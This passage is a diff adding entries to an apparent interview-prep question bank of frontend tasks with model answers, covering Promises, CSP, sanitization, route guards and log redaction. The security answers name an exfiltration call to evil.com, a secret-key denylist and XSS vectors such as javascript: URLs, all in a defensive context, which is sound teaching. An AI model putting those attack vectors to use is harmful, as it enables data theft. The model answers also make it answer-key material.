+    "order": 43
+  },
+  {
+    "id": "abortable-fetch-pattern",
+    "companies": [
+      "Meta",
+      "TikTok",
+      "Stripe"
+    ],
+    "title": "Implement cancellable async flow with AbortController",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Show how to make async requests cancellable using `AbortController`, and explain how to avoid race conditions in rapid user interactions.",
+    "answerType": "mixed",
+    "tags": [
+      "promises",
+      "abortcontroller",
+      "cancellation",
+      "race conditions"
+    ],
+    "answer": "// Interview explanation:\n// Promises are not cancellable by themselves.\n// Cancellation is usually modeled via AbortSignal passed to APIs (fetch, streams).\n\nfunction createSearchClient(endpoint) {\n  let controller = null\n\n  return async function search(query) {\n    // cancel previous in-flight request\n    if (controller) controller.abort()\n    controller = new AbortController()\n\n    try {\n      const res = await fetch(\n        `${endpoint}?q=${encodeURIComponent(query)}`,\n        { signal: controller.signal }\n      )\n      if (!res.ok) throw new Error('HTTP ' + res.status)\n      return await res.json()\n    } catch (err) {\n      if (err && err.name === 'AbortError') {\n        // expected cancellation path; do not show error toast\n        return null\n      }\n      throw err\n    }\n  }\n}\n\n// Usage\nconst search = createSearchClient('/api/search')\n// rapid typing: only latest request is allowed to complete\nsearch('rea')\nsearch('react')\nsearch('react hooks')",
+    "order": 44
+  },
+  {
+    "id": "priority-task-queue",
+    "companies": [
+      "Google",
+      "Uber",
+      "Amazon"
+    ],
+    "title": "Design async priority queue with concurrency",
+    "difficulty": "hard",
+    "category": "Async & Promises",
+    "description": "Implement a priority-based async task queue that executes higher-priority tasks first while respecting a max concurrency limit.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "queue",
+      "priority",
+      "concurrency"
+    ],
+    "answer": "class PriorityTaskQueue {\n  constructor(concurrency = 2) {\n    this.concurrency = concurrency\n    this.running = 0\n    this.queue = [] // { priority, task, resolve, reject, seq }\n    this.seq = 0\n  }\n\n  add(task, priority = 0) {\n    return new Promise((resolve, reject) => {\n      this.queue.push({ task, priority, resolve, reject, seq: this.seq++ })\n      // higher priority first, stable order for same priority\n      this.queue.sort((a, b) =>\n        b.priority - a.priority || a.seq - b.seq\n      )\n      this._drain()\n    })\n  }\n\n  _drain() {\n    while (this.running < this.concurrency && this.queue.length > 0) {\n      const item = this.queue.shift()\n      this.running++\n\n      Promise.resolve()\n        .then(() => item.task())\n        .then(item.resolve, item.reject)\n        .finally(() => {\n          this.running--\n          this._drain()\n        })\n    }\n  }\n}\n\n// Usage\nconst q = new PriorityTaskQueue(2)\nq.add(() => Promise.resolve('low-1'), 1).then(console.log)\nq.add(() => Promise.resolve('high'), 10).then(console.log)\nq.add(() => new Promise((r) => setTimeout(() => r('low-2'), 30)), 1).then(console.log)",
+    "order": 45
+  },
+  {
+    "id": "promise-chain-implementation",
+    "companies": [
+      "Apple",
+      "Meta",
+      "Google"
+    ],
+    "title": "Implement a minimal Promise class (then/catch)",
+    "difficulty": "hard",
+    "category": "Async & Promises",
+    "description": "Implement a simplified Promise class supporting asynchronous resolution, `then`, and `catch` chaining (educational subset of Promises/A+ behavior).",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "internals",
+      "event loop"
+    ],
+    "answer": "class MiniPromise {\n  constructor(executor) {\n    this.state = 'pending'\n    this.value = undefined\n    this.handlers = []\n\n    const resolve = (value) => this._settle('fulfilled', value)\n    const reject = (reason) => this._settle('rejected', reason)\n\n    try {\n      executor(resolve, reject)\n    } catch (err) {\n      reject(err)\n    }\n  }\n\n  _settle(state, value) {\n    if (this.state !== 'pending') return\n    this.state = state\n    this.value = value\n    queueMicrotask(() => {\n      this.handlers.forEach((h) => this._handle(h))\n      this.handlers = []\n    })\n  }\n\n  _handle(handler) {\n    if (this.state === 'pending') {\n      this.handlers.push(handler)\n      return\n    }\n\n    const cb =\n      this.state === 'fulfilled' ? handler.onFulfilled : handler.onRejected\n\n    if (!cb) {\n      ;(this.state === 'fulfilled' ? handler.resolve : handler.reject)(this.value)\n      return\n    }\n\n    try {\n      handler.resolve(cb(this.value))\n    } catch (err) {\n      handler.reject(err)\n    }\n  }\n\n  then(onFulfilled, onRejected) {\n    return new MiniPromise((resolve, reject) => {\n      this._handle({ onFulfilled, onRejected, resolve, reject })\n    })\n  }\n\n  catch(onRejected) {\n    return this.then(undefined, onRejected)\n  }\n}\n\n// Usage\nnew MiniPromise((resolve) => setTimeout(() => resolve(2), 10))\n  .then((x) => x * 3)\n  .then(console.log) // 6",
+    "order": 46
+  },
+  {
+    "id": "promise-foreach-pitfall",
+    "companies": [
+      "Amazon",
+      "Meta",
+      "Stripe"
+    ],
+    "title": "Why async/await with forEach is a bug",
+    "difficulty": "easy",
+    "category": "Async & Promises",
+    "description": "Explain why `await arr.forEach(async ...)` does not wait, and show correct sequential and parallel alternatives.",
+    "answerType": "mixed",
+    "tags": [
+      "async",
+      "await",
+      "pitfalls",
+      "loops"
+    ],
+    "answer": "// Pitfall:\n// forEach ignores returned promises, so outer await does nothing useful.\nasync function wrong(items) {\n  await items.forEach(async (item) => {\n    await save(item)\n  })\n  console.log('done') // runs before saves finish\n}\n\n// Sequential (ordered):\nasync function sequential(items) {\n  for (const item of items) {\n    await save(item)\n  }\n}\n\n// Parallel (faster, unordered completion):\nasync function parallel(items) {\n  await Promise.all(items.map((item) => save(item)))\n}\n\n// Rule: use for...of for sequential work, Promise.all(map) for parallel work.",
+    "order": 47
+  },
+  {
+    "id": "missing-return-in-then-chain",
+    "companies": [
+      "Google",
+      "Netflix",
+      "Uber"
+    ],
+    "title": "Missing return in .then() chain",
+    "difficulty": "easy",
+    "category": "Async & Promises",
+    "description": "Identify the common bug where a promise is created inside `.then` but not returned, breaking chaining and error propagation.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "then",
+      "pitfalls",
+      "error handling"
+    ],
+    "answer": "// Buggy:\nfetchUser()\n  .then((user) => {\n    fetchOrders(user.id) // missing return\n  })\n  .then((orders) => {\n    console.log(orders) // often undefined\n  })\n\n// Correct:\nfetchUser()\n  .then((user) => {\n    return fetchOrders(user.id)\n  })\n  .then((orders) => {\n    console.log(orders)\n  })\n  .catch(console.error)\n\n// Async/await equivalent (usually clearer):\nasync function run() {\n  const user = await fetchUser()\n  const orders = await fetchOrders(user.id)\n  console.log(orders)\n}",
+    "order": 48
+  },
+  {
+    "id": "unhandled-rejection-debugging",
+    "companies": [
+      "Meta",
+      "Amazon",
+      "Google"
+    ],
+    "title": "Unhandled promise rejections: causes and fixes",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Explain what unhandled promise rejections are, why they happen, and how to systematically prevent them in app code.",
+    "answerType": "mixed",
+    "tags": [
+      "promises",
+      "errors",
+      "debugging",
+      "best practices"
+    ],
+    "answer": "Interview explanation:\n- An unhandled rejection means a promise rejected without a rejection handler.\n- In modern runtimes this is noisy and can crash processes (Node settings dependent).\n\nCommon causes:\n1) Fire-and-forget promise without .catch.\n2) Missing await in try/catch (error escapes scope).\n3) Missing return in .then chain.\n\nExamples:\nvoid riskyAsync().catch(reportError) // explicit fire-and-forget handling\n\nasync function handler() {\n  try {\n    await riskyAsync()\n  } catch (err) {\n    reportError(err)\n  }\n}\n\nPrevention checklist:\n- Always return/await promises from functions.\n- Add a terminal .catch on top-level chains.\n- Wrap UI event async handlers in try/catch.\n- Centralize logging for unexpected async failures.",
+    "order": 49
+  },
+  {
+    "id": "dropdown-portal-positioning",
+    "companies": [
+      "Google",
+      "Meta",
+      "Airbnb",
+      "Stripe"
+    ],
+    "title": "Design robust dropdown positioning (top/bottom) with portals",
+    "difficulty": "hard",
+    "category": "System Design",
+    "description": "Design a dropdown/popover that chooses top or bottom placement based on available viewport space, avoids clipping, and renders in a portal when parent overflow would hide it.",
+    "answerType": "mixed",
+    "tags": [
+      "dropdown",
+      "portals",
+      "positioning",
+      "UX"
+    ],
+    "answer": "## Why portals?\n\nWhen a trigger lives inside a container with `overflow: hidden` or `overflow: auto`, an absolutely-positioned child is clipped to that container's bounds. Portaling the dropdown to `document.body` sidesteps the stacking-context and clipping problem entirely.\n\n```tsx\n// Minimal portal wrapper\nfunction Portal({ children }: { children: React.ReactNode }) {\n  return ReactDOM.createPortal(children, document.body)\n}\n```\n\n## Placement algorithm\n\nCalculate available space **before** rendering and pick the side with more room:\n\n```ts\nfunction getPlacement(triggerRect: DOMRect, dropdownHeight: number): 'top' | 'bottom' {\n  const spaceBelow = window.innerHeight - triggerRect.bottom\n  const spaceAbove = triggerRect.top\n  if (spaceBelow >= dropdownHeight) return 'bottom'\n  if (spaceAbove >= dropdownHeight) return 'top'\n  // Fallback: whichever side has more space\n  return spaceBelow >= spaceAbove ? 'bottom' : 'top'\n}\n```\n\n## Positioning the portal element\n\nAfter choosing placement, compute `position: fixed` coordinates from the trigger's `getBoundingClientRect()`:\n\n```ts\nfunction buildStyle(triggerRect: DOMRect, placement: 'top' | 'bottom'): React.CSSProperties {\n  return {\n    position: 'fixed',\n    left: triggerRect.left,\n    width: triggerRect.width,\n    ...(placement === 'bottom'\n      ? { top: triggerRect.bottom + 4 }   // 4px gap\n      : { bottom: window.innerHeight - triggerRect.top + 4 }),\n  }\n}\n```\n\n## Keeping it in sync\n\n- **Scroll / resize**: re-run the rect calculation on `scroll` (capture phase) and `resize`. Use `ResizeObserver` on the trigger for layout shifts.\n- **Close on outside click**: attach a `mousedown` listener on `document` and close if the target is outside both the trigger and the dropdown.\n- **Keyboard**: close on `Escape`, trap focus inside the dropdown, return focus to the trigger on close.\n\n## Full hook\n\n```ts\nfunction useDropdown(dropdownHeight = 200) {\n  const triggerRef = useRef<HTMLElement>(null)\n  const [open, setOpen] = useState(false)\n  const [style, setStyle] = useState<React.CSSProperties>({})\n\n  const update = useCallback(() => {\n    const rect = triggerRef.current?.getBoundingClientRect()\n    if (!rect) return\n    const placement = getPlacement(rect, dropdownHeight)\n    setStyle(buildStyle(rect, placement))\n  }, [dropdownHeight])\n\n  useEffect(() => {\n    if (!open) return\n    update()\n    window.addEventListener('scroll', update, true)\n    window.addEventListener('resize', update)\n    return () => {\n      window.removeEventListener('scroll', update, true)\n      window.removeEventListener('resize', update)\n    }\n  }, [open, update])\n\n  return { triggerRef, open, setOpen, style }\n}\n```\n\n## Interview checklist\n\n| Concern | Technique |\n|---|---|\n| Overflow clipping | Portal to `document.body` with `position: fixed` |\n| Placement | `getBoundingClientRect` + compare `spaceAbove` vs `spaceBelow` |\n| Keeps in sync | `scroll` (capture) + `resize` listeners |\n| Outside-click close | `mousedown` on `document`, check `contains` |\n| Viewport edge | Clamp `left` so the panel never overflows left/right |\n| Accessibility | `aria-expanded`, `aria-haspopup`, focus trap, `Escape` to close |\n| Cleanup | Remove listeners + portal node on unmount |",
+    "order": 50
+  },
+  {
+    "id": "double-resolve-race-guard",
+    "companies": [
+      "Stripe",
+      "TikTok",
+      "Apple"
+    ],
+    "title": "Guard against double resolve/reject in wrappers",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "When adapting callback APIs to promises, demonstrate how to prevent accidental multiple settle calls.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "wrappers",
+      "callbacks",
+      "pitfalls"
+    ],
+    "answer": "function fromCallback(register) {\n  return new Promise((resolve, reject) => {\n    let settled = false\n\n    const onceResolve = (value) => {\n      if (settled) return\n      settled = true\n      resolve(value)\n    }\n\n    const onceReject = (err) => {\n      if (settled) return\n      settled = true\n      reject(err)\n    }\n\n    try {\n      register(onceResolve, onceReject)\n    } catch (err) {\n      onceReject(err)\n    }\n  })\n}\n\n// Usage: adapt odd callback API\nconst p = fromCallback((ok, fail) => {\n  ok('first')\n  ok('second') // ignored safely\n})\np.then(console.log) // first",
+    "order": 51
+  },
+  {
+    "id": "csp-strict-design",
+    "companies": [
+      "CrowdStrike",
+      "Google",
+      "Tenable"
+    ],
+    "title": "Design a strict Content Security Policy (CSP) for a SPA",
+    "difficulty": "hard",
+    "category": "DOM & Browser",
+    "description": "Design a strict CSP for a single-page app dashboard. Cover script/style sources, nonces vs hashes, `strict-dynamic`, reporting, and how to migrate from a permissive policy without breaking production.",
+    "answerType": "mixed",
+    "tags": [
+      "security",
+      "CSP",
+      "XSS",
+      "headers"
+    ],
+    "answer": "Interview framing:\n- CSP is defense-in-depth against XSS, data exfiltration, and clickjacking.\n- Goal: prevent inline script execution and limit network egress to a known allowlist.\n\nStrict baseline (recommended starting point):\n```\nContent-Security-Policy:\n  default-src 'none';\n  script-src 'nonce-{RANDOM}' 'strict-dynamic';\n  style-src  'self' 'nonce-{RANDOM}';\n  img-src    'self' data: https://cdn.example.com;\n  font-src   'self' data:;\n  connect-src 'self' https://api.example.com https://telemetry.example.com;\n  frame-ancestors 'none';\n  base-uri 'none';\n  form-action 'self';\n  object-src 'none';\n  report-to csp-endpoint;\n```\n\nKey choices:\n- 'nonce-…' + 'strict-dynamic': trust scripts that come from a nonce'd loader, ignore host allowlists. Rotates per response (server-generated, cryptographically random, never reused).\n- 'unsafe-inline' / 'unsafe-eval': never in production. Vite/webpack production builds should not need eval.\n- frame-ancestors 'none' (or specific origins) is the modern X-Frame-Options.\n- object-src 'none' kills Flash/legacy plugin XSS vectors.\n- base-uri 'none' prevents <base> tag injection from rerouting relative URLs.\n\nMigration plan:\n1) Deploy in Report-Only mode (`Content-Security-Policy-Report-Only`) to a reporting endpoint.\n2) Triage report-to violations by directive; whitelist legitimate sources, fix illegitimate ones.\n3) Replace inline event handlers (onclick) and inline <script> with external + nonce.\n4) Move CSS-in-JS injection through nonce'd <style> tags.\n5) Flip to enforcing mode behind a feature flag, region-by-region.\n\nCommon pitfalls:\n- Nonces reused across requests (defeats the purpose).\n- Forgetting connect-src for analytics/websocket endpoints.\n- Missing frame-ancestors lets the page be iframed for clickjacking.\n- 'self' on script-src + a CDN with open uploads = XSS bypass.",
+    "order": 52
+  },
+  {
+    "id": "detect-supply-chain-script",
+    "companies": [
+      "CrowdStrike"
+    ],
+    "title": "Detect a malicious 3rd-party script at runtime",
+    "difficulty": "hard",
+    "category": "DOM & Browser",
+    "description": "You shipped a dependency that started exfiltrating form data after an upstream compromise. How would you detect this from the browser at runtime, and what guardrails should you have in place?",
+    "answerType": "mixed",
+    "tags": [
+      "security",
+      "supply chain",
+      "observability",
+      "CSP"
+    ],
+    "answer": "Interview framing:\n- Modern XSS is increasingly supply-chain (Magecart-style) — your own code is fine, an npm dep is not.\n- Browser-side detection is best-effort; the real fix is preventing execution.\n\nLayered defenses (in order of strength):\n1) Subresource Integrity (SRI):\n   <script src=\"https://cdn/x.js\" integrity=\"sha384-...\" crossorigin=\"anonymous\"></script>\n   Browser refuses to execute if the hash changes. Pin every external script.\n2) Strict CSP with nonces + connect-src allowlist:\n   Even if the script runs, fetch('https://evil.com') is blocked and reported.\n3) Lockfile + automated dep scanning (Snyk/Socket/Dependabot) in CI.\n4) Self-host critical 3rd-party JS through your own pipeline so you control the bytes.\n\nRuntime detection signals:\n- CSP report-to / report-uri violations spiking (especially connect-src / script-src).\n- ReportingObserver for deprecation/intervention/csp-violation events.\n- Patch fetch + XMLHttpRequest.send to log unknown destinations:\n\n```js\nconst allowed = new Set(['api.example.com', 'telemetry.example.com'])\nconst origFetch = window.fetch\nwindow.fetch = function (input, init) {\n  try {\n    const url = new URL(typeof input === 'string' ? input : input.url, location.href)\n    if (!allowed.has(url.host)) {\n      navigator.sendBeacon('/sec/anomaly', JSON.stringify({\n        kind: 'unexpected-fetch',\n        host: url.host,\n        page: location.pathname,\n      }))\n    }\n  } catch {}\n  return origFetch.apply(this, arguments)\n}\n```\n\n- MutationObserver on document.head/body for unexpected <script> or <iframe> injection.\n- Watch for rogue overrides of HTMLFormElement.prototype.submit or input value getters\n  (classic skimmer pattern).\n\nIncident response:\n- Kill switch: feature flag that swaps the bad dep for a safe stub at the edge.\n- Rotate any auth tokens that may have been exposed.\n- Pull the version from CDN, force cache bust, file an advisory.",
+    "order": 53
+  },
+  {
+    "id": "realtime-event-stream-design",
+    "companies": [
+      "CrowdStrike",
+      "Netflix"
+    ],
+    "title": "Design a real-time event stream UI for high-volume telemetry",
+    "difficulty": "hard",
+    "category": "System Design",
+    "description": "Design a frontend that displays a live stream of security events (think 5k-50k events/min) with filtering, virtualization, and pause/resume — without freezing the browser.",
+    "answerType": "mixed",
+    "tags": [
+      "system design",
+      "real-time",
+      "virtualization",
+      "performance"
+    ],
+    "answer": "Interview framing:\n- The hard parts are not the UI components; they are backpressure, batching, and memory.\n- A naive setState per WS message at 50k/min = main thread death.\n\nTransport:\n- WebSocket (or SSE if one-way) with sequence numbers for gap detection.\n- Server-side filter/projection so the browser only receives subscribed event kinds.\n- Heartbeats every 15-30s; auto-reconnect with exponential backoff + resume-from-seq.\n\nIngestion pipeline (client):\n1) WebSocket onmessage pushes into a ring buffer (Array of fixed cap, e.g. 10k).\n2) A rAF/setTimeout-driven flusher (every ~100ms) drains the buffer into React state\n   in one batched setState. This caps re-renders at ~10/s regardless of event rate.\n3) When buffer is full, drop oldest + increment a \"dropped\" counter shown in the UI\n   (visible backpressure beats silent freeze).\n4) Pause button stops the flusher but keeps WS draining into the ring buffer; on\n   resume, jump to the latest N or replay depending on UX choice.\n\nRendering:\n- Virtualized list (react-window / TanStack Virtual). Never render 10k DOM rows.\n- Row component memoized with stable keys (event.id), shallow-equal props.\n- Time-based grouping headers computed off-thread or memoized by minute bucket.\n\nFiltering:\n- Apply server-side first (subscription filter).\n- Client-side secondary filter runs on the buffered slice, not the raw stream.\n- For complex queries, debounce the filter input and run the predicate in a\n  Web Worker so the main thread stays at 60fps.\n\nObservability of the UI itself:\n- Track dropped count, lag (now - latest event ts), reconnect count, render time.\n- Expose them in a debug panel so SREs can diagnose \"feed feels slow\" reports.\n\nPitfalls to call out:\n- React state with append-only arrays grows unbounded — cap it.\n- Date.now() formatting per row per render is surprisingly hot — memoize or use Intl.RelativeTimeFormat sparingly.\n- Auto-scroll to bottom only when user is already at bottom; otherwise users lose their place.",
+    "order": 54
+  },
+  {
+    "id": "redact-pii-in-logs",
+    "companies": [
+      "CrowdStrike",
+      "Stripe"
+    ],
+    "title": "Redact PII before sending logs to a telemetry backend",
+    "difficulty": "medium",
+    "category": "Performance",
+    "description": "Implement a small client-side log scrubber that redacts PII (emails, tokens, credit cards) from log payloads before they leave the browser. Keep it fast and side-effect free.",
+    "answerType": "code",
+    "tags": [
+      "security",
+      "logging",
+      "PII",
+      "telemetry"
+    ],
+    "answer": "// Goals:\n// - No mutation of caller objects (defensive copy).\n// - Bounded depth and size to avoid pathological inputs.\n// - Allowlist of obviously-safe keys, denylist of obviously-sensitive keys.\n\nconst SENSITIVE_KEYS = /(^|_)(password|token|secret|authorization|api[_-]?key|cookie|ssn)$/i\n\nconst PATTERNS = [\n  // Emails\n  { re: /[\\w.+-]+@[\\w-]+\\.[\\w.-]+/g, mask: '[email]' },\n  // 13-19 digit card-ish numbers (with optional spaces/dashes)\n  { re: /\\b(?:\\d[ -]*?){13,19}\\b/g, mask: '[card]' },\n  // JWT-shaped tokens\n  { re: /\\beyJ[\\w-]+\\.[\\w-]+\\.[\\w-]+\\b/g, mask: '[jwt]' },\n  // Bearer / Basic header values\n  { re: /\\b(Bearer|Basic)\\s+[A-Za-z0-9._\\-+/=]+/g, mask: '$1 [redacted]' },\n]\n\nfunction redactString(str) {\n  let out = str\n  for (const { re, mask } of PATTERNS) out = out.replace(re, mask)\n  return out\n}\n\nexport function redact(value, depth = 0) {\n  if (depth > 6) return '[depth-cut]'\n  if (value == null) return value\n  if (typeof value === 'string') return redactString(value)\n  if (typeof value !== 'object') return value\n  if (Array.isArray(value)) return value.map((v) => redact(v, depth + 1))\n\n  const out = {}\n  for (const [key, val] of Object.entries(value)) {\n    if (SENSITIVE_KEYS.test(key)) {\n      out[key] = '[redacted]'\n      continue\n    }\n    out[key] = redact(val, depth + 1)\n  }\n  return out\n}\n\n// Usage\nconst event = {\n  user: { email: 'alice@example.com', authorization: 'Bearer abc.def.ghi' },\n  message: 'login failed for alice@example.com',\n}\nconsole.log(redact(event))\n// { user: { email: '[email]', authorization: '[redacted]' },\n//   message: 'login failed for [email]' }\n\n// Follow-ups:\n// - Move heavy regexes to a Web Worker if you redact at high volume.\n// - Consider a JSON Schema-driven redactor when payload shape is known (faster).\n// - Always redact on the client AND on the server; never trust either alone.",
+    "order": 55
+  },
+  {
+    "id": "web-worker-offload",
+    "companies": [
+      "CrowdStrike",
+      "Google"
+    ],
+    "title": "Offload heavy parsing to a Web Worker (with cancellation)",
+    "difficulty": "medium",
+    "category": "Performance",
+    "description": "You parse large JSON / log blobs in the browser and the main thread janks. Wrap a Web Worker in a clean Promise-based API with cancellation and request IDs.",
+    "answerType": "code",
+    "tags": [
+      "web workers",
+      "performance",
+      "concurrency",
+      "cancellation"
+    ],
+    "answer": "// worker.js — runs off the main thread\nself.onmessage = (e) => {\n  const { id, payload } = e.data\n  try {\n    // Replace with real heavy work (parse, decompress, indexing, etc.)\n    const result = JSON.parse(payload)\n    self.postMessage({ id, ok: true, result })\n  } catch (err) {\n    self.postMessage({ id, ok: false, error: String(err) })\n  }\n}\n\n// workerClient.js — main thread API\nexport function createWorkerClient(workerUrl) {\n  const worker = new Worker(workerUrl, { type: 'module' })\n  const pending = new Map() // id -> { resolve, reject, signal, onAbort }\n  let nextId = 0\n\n  worker.onmessage = (e) => {\n    const { id, ok, result, error } = e.data\n    const entry = pending.get(id)\n    if (!entry) return // already cancelled\n    pending.delete(id)\n    entry.signal?.removeEventListener('abort', entry.onAbort)\n    ok ? entry.resolve(result) : entry.reject(new Error(error))\n  }\n\n  function run(payload, { signal } = {}) {\n    if (signal?.aborted) return Promise.reject(new DOMException('Aborted', 'AbortError'))\n\n    return new Promise((resolve, reject) => {\n      const id = nextId++\n      const onAbort = () => {\n        if (!pending.has(id)) return\n        pending.delete(id)\n        reject(new DOMException('Aborted', 'AbortError'))\n        // Cooperative cancel: tell the worker to drop this id if it supports it.\n        worker.postMessage({ id, cancel: true })\n      }\n      pending.set(id, { resolve, reject, signal, onAbort })\n      signal?.addEventListener('abort', onAbort, { once: true })\n      worker.postMessage({ id, payload })\n    })\n  }\n\n  function terminate() {\n    worker.terminate()\n    pending.forEach((p) => p.reject(new Error('worker terminated')))\n    pending.clear()\n  }\n\n  return { run, terminate }\n}\n\n// Usage\nconst client = createWorkerClient(new URL('./worker.js', import.meta.url))\nconst ctrl = new AbortController()\nclient.run(bigJsonString, { signal: ctrl.signal })\n  .then((parsed) => render(parsed))\n  .catch((err) => { if (err.name !== 'AbortError') reportError(err) })\n\n// Cancel if the user navigates away:\nctrl.abort()\n\n// Interview talking points:\n// - Use Transferable objects (ArrayBuffer) for zero-copy where possible.\n// - Pool workers when calls are frequent (creation cost is ~1-5ms).\n// - Workers don't have DOM access; serialize data, not functions.",
+    "order": 56
+  },
+  {
+    "id": "role-based-route-guard",
+    "companies": [
+      "CrowdStrike",
+      "Stripe"
+    ],
+    "title": "Implement role-based route guards on the client",
+    "difficulty": "medium",
+    "category": "System Design",
+    "description": "Design a React route-guard pattern for an admin console with multiple roles (admin, analyst, viewer). Cover the security caveats — what the client guard actually buys you and what it does not.",
+    "answerType": "code",
+    "tags": [
+      "react",
+      "auth",
+      "rbac",
+      "security"
+    ],
+    "answer": "// First, the honest part:\n// Client-side guards are a UX layer, NOT a security boundary.\n// Every protected action MUST be re-checked on the server.\n// The client guard exists to:\n//  1) Hide controls a user cannot use (less confusing).\n//  2) Avoid wasted requests that will 403 anyway.\n//  3) Redirect unauth'd users to login before they hit a broken UI.\n\nimport { Navigate, Outlet, useLocation } from 'react-router-dom'\n\ntype Role = 'admin' | 'analyst' | 'viewer'\n\ninterface Session {\n  userId: string\n  roles: Role[]\n}\n\nconst SessionCtx = createContext<Session | null>(null)\nexport const useSession = () => useContext(SessionCtx)\n\nexport function hasAny(session: Session | null, allowed: Role[]): boolean {\n  if (!session) return false\n  return session.roles.some((r) => allowed.includes(r))\n}\n\nexport function RequireRole({ allowed }: { allowed: Role[] }) {\n  const session = useSession()\n  const location = useLocation()\n\n  if (!session) {\n    return <Navigate to=\"/login\" replace state={{ from: location }} />\n  }\n  if (!hasAny(session, allowed)) {\n    return <Navigate to=\"/403\" replace />\n  }\n  return <Outlet />\n}\n\n// Usage with React Router\n<Routes>\n  <Route element={<RequireRole allowed={['admin', 'analyst', 'viewer']} />}>\n    <Route path=\"/dashboard\" element={<Dashboard />} />\n  </Route>\n  <Route element={<RequireRole allowed={['admin', 'analyst']} />}>\n    <Route path=\"/incidents\" element={<Incidents />} />\n  </Route>\n  <Route element={<RequireRole allowed={['admin']} />}>\n    <Route path=\"/admin/users\" element={<UserAdmin />} />\n  </Route>\n</Routes>\n\n// Per-control gating\nfunction DangerButton() {\n  const session = useSession()\n  if (!hasAny(session, ['admin'])) return null\n  return <button onClick={deleteEverything}>Delete</button>\n}\n\n// Pitfalls to mention in the interview:\n// - Don't ship admin-only code splits to non-admins (use route-level lazy loading\n//   so the JS bundle isn't even fetched).\n// - Refresh the session on focus/visibility — roles can change.\n// - Treat `session` as untrusted input; never let it grant access to data the\n//   server wouldn't return anyway.\n// - For deep-link sharing, distinguish \"not logged in\" vs \"logged in but forbidden\"\n//   so users get the right next action.",
+    "order": 57
+  },
+  {
+    "id": "safe-html-rendering",
+    "companies": [
+      "CrowdStrike",
+      "Google",
+      "Meta",
+      "Tenable"
+    ],
+    "title": "Safely render user-supplied HTML (sanitization)",
+    "difficulty": "medium",
+    "category": "DOM & Browser",
+    "description": "You need to render user-authored markdown / rich text in a security console (analyst notes). Walk through a safe pipeline and the trust boundaries.",
+    "answerType": "mixed",
+    "tags": [
+      "security",
+      "XSS",
+      "sanitization",
+      "markdown"
+    ],
+    "answer": "Trust boundaries:\n- Input source: an authenticated analyst — still untrusted from the renderer's POV.\n- Output target: the same domain as the auth cookie — XSS = full account takeover.\n- Therefore: sanitize on render, every time, no exceptions.\n\nRecommended pipeline:\n1) Parse markdown -> HTML with a strict parser (e.g. `marked` or `remark`).\n   Disable raw HTML pass-through if you don't need it.\n2) Sanitize the HTML with DOMPurify configured to an allowlist:\n\n```ts\nimport DOMPurify from 'dompurify'\n\nconst SAFE_CONFIG: DOMPurify.Config = {\n  ALLOWED_TAGS: [\n    'a','b','blockquote','br','code','em','h1','h2','h3','h4','hr',\n    'i','li','ol','p','pre','s','span','strong','table','tbody','td',\n    'th','thead','tr','ul'\n  ],\n  ALLOWED_ATTR: ['href','title','class','rel','target'],\n  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\\/)/i,\n  FORBID_ATTR: ['style','onerror','onload','onclick'],\n  FORBID_TAGS: ['script','iframe','object','embed','form','input'],\n}\n\nDOMPurify.addHook('afterSanitizeAttributes', (node) => {\n  if (node.tagName === 'A') {\n    node.setAttribute('rel', 'noopener noreferrer nofollow')\n    node.setAttribute('target', '_blank')\n  }\n})\n\nexport function renderSafeHtml(dirtyHtml: string): string {\n  return DOMPurify.sanitize(dirtyHtml, SAFE_CONFIG)\n}\n```\n\n3) Inject with `dangerouslySetInnerHTML` (React) or `element.innerHTML`. The name\n   of the React API is intentionally scary — keep the unsafe surface tiny.\n\n```tsx\nfunction NoteBody({ markdown }: { markdown: string }) {\n  const html = useMemo(\n    () => renderSafeHtml(markdownToHtml(markdown)),\n    [markdown]\n  )\n  return <div className=\"note\" dangerouslySetInnerHTML={{ __html: html }} />\n}\n```\n\nDefense in depth (don't rely on one layer):\n- CSP with no 'unsafe-inline' on script-src.\n- Trusted Types (Chromium) so any string -> sink without policy throws.\n- Server-side sanitize on write so a bug in the client doesn't taint storage forever.\n\nThings that look safe but aren't:\n- Stripping <script> with regex. (Use a parser. Always.)\n- Allowing `style` attributes (CSS injection -> data exfiltration via background-image).\n- Allowing `javascript:` URLs in <a href>. URI regex must allowlist schemes.\n- Allowing `srcdoc` on iframes.",
+    "order": 58
+  },
+  {
+    "id": "rate-limit-frontend",
+    "companies": [
+      "CrowdStrike",
+      "Stripe"
+    ],
+    "title": "Implement client-side rate limiting for an action",
+    "difficulty": "medium",
+    "category": "Performance",
+    "description": "Implement a token-bucket rate limiter in JS that throttles a function (e.g. log forwarder) to N calls per interval, queueing or dropping overflow.",
+    "answerType": "code",
+    "tags": [
+      "rate limiting",
+      "token bucket",
+      "performance",
+      "algorithms"
+    ],
+    "answer": "// Token bucket: capacity tokens, refilled at refillPerMs rate.\n// Each call costs 1 token. If no token, either drop or queue.\n\nexport function createTokenBucket({\n  capacity,\n  refillPerSecond,\n  mode = 'queue', // 'queue' | 'drop'\n}) {\n  let tokens = capacity\n  let lastRefill = Date.now()\n  const queue = []\n\n  function refill() {\n    const now = Date.now()\n    const elapsed = (now - lastRefill) / 1000\n    tokens = Math.min(capacity, tokens + elapsed * refillPerSecond)\n    lastRefill = now\n  }\n\n  function tryDrain() {\n    refill()\n    while (queue.length && tokens >= 1) {\n      tokens -= 1\n      const { fn, resolve, reject } = queue.shift()\n      Promise.resolve()\n        .then(fn)\n        .then(resolve, reject)\n    }\n    if (queue.length) {\n      const waitMs = ((1 - tokens) / refillPerSecond) * 1000\n      setTimeout(tryDrain, Math.max(10, waitMs))\n    }\n  }\n\n  return function schedule(fn) {\n    return new Promise((resolve, reject) => {\n      refill()\n      if (tokens >= 1 && queue.length === 0) {\n        tokens -= 1\n        Promise.resolve().then(fn).then(resolve, reject)\n        return\n      }\n      if (mode === 'drop') {\n        reject(new Error('rate-limited'))\n        return\n      }\n      queue.push({ fn, resolve, reject })\n      tryDrain()\n    })\n  }\n}\n\n// Usage: forward at most 5 logs/sec, queue the rest\nconst sendLog = createTokenBucket({ capacity: 10, refillPerSecond: 5 })\n\nfor (const event of events) {\n  sendLog(() => fetch('/log', { method: 'POST', body: 